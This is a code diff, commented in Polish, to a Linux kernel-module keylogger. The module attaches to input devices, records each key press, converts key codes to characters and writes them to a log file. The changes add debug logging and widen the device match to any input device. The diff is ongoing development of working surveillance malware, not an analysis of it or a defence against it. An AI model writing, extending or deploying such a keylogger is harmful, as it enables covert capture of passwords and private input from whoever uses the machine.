@@ -47,7 +47,7 @@ static void log_key_to_file(void) {
         if (file) {
             int len = strlen(log_buffer);
             kernel_write(file, log_buffer, len, &file->f_pos);
-            buffer_len = 0;  // Czyszczenie bufora po zapisie
+            buffer_len = 0;  // Zresetuj bufor po zapisie
         }
         
         mutex_unlock(&keylog_mutex);  // Zwolnienie mutexa
@@ -56,6 +56,7 @@ static void log_key_to_file(void) {
 
 // Funkcja obsługująca zdarzenie naciśnięcia klawisza
 static void keylogger_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
+    printk(KERN_INFO "Event received: type=%u, code=%u, value=%d\n", type, code, value);  // Logowanie zdarzenia
     if (type == EV_KEY && value == 1) {  // Zdarzenie naciśnięcia klawisza
         printk(KERN_INFO "Key pressed: %u\n", code);
         char key = keycode_to_char(code);  // Mapowanie kodu na znak
@@ -74,6 +75,8 @@ static void keylogger_event(struct input_handle *handle, unsigned int type, unsi
 static int keylogger_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
     struct input_handle *handle;
 
+    printk(KERN_INFO "Connecting to input device: %s\n", dev->name);  // Logowanie podłączenia urządzenia wejściowego
+
     handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
     if (!handle)
         return -ENOMEM;
@@ -90,12 +93,13 @@ static int keylogger_connect(struct input_handler *handler, struct input_dev *de
 
 // Funkcja rozłączająca urządzenie wejściowe
 static void keylogger_disconnect(struct input_handle *handle) {
+    printk(KERN_INFO "Disconnecting from input device\n");  // Logowanie rozłączenia
     input_close_device(handle);
     input_unregister_handle(handle);
     kfree(handle);
 }
 
-// Tabela identyfikatorów urządzeń
+// Tabela identyfikatorów urządzeń (teraz pozwalamy na dowolne urządzenia wejściowe)
 static const struct input_device_id keylogger_ids[] = {
     { .driver_info = 1 },
     { },
@@ -114,6 +118,8 @@ static struct input_handler keylogger_handler = {
 
 // Funkcja inicjalizacyjna
 static int __init keylogger_init(void) {
+    printk(KERN_INFO "Keylogger module loaded\n");
+
     // Inicjalizujemy mutex
     mutex_init(&keylog_mutex);
 
@@ -130,6 +136,8 @@ static int __init keylogger_init(void) {
 
 // Funkcja końcowa
 static void __exit keylogger_exit(void) {
+    printk(KERN_INFO "Keylogger module unloaded\n");
+
     // Zamykamy plik
     if (file)
         filp_close(file, NULL);
